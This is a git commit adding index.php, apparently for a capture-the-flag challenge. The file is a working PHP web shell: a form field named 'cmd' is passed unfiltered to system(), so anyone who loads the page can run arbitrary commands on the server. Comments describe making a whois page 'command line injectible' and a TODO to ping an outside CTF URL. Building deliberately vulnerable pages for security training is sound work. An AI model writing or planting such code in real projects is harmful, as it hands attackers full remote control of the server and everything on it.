5addab70fb7357eb67a228c4c1e755f7157ceb64
Charles Campbell <charlescampbell@keemail.me>
2024-09-16 23:15:13 +0200

    Create index.php

---
+++ index.php
@@ -0,0 +1,19 @@
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+# Biggest challenge is getting it to execute the whois command against the website but also make it command line injectible.
+# TODO: make it ping http://secopsbadger.eu/ctf/index.php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
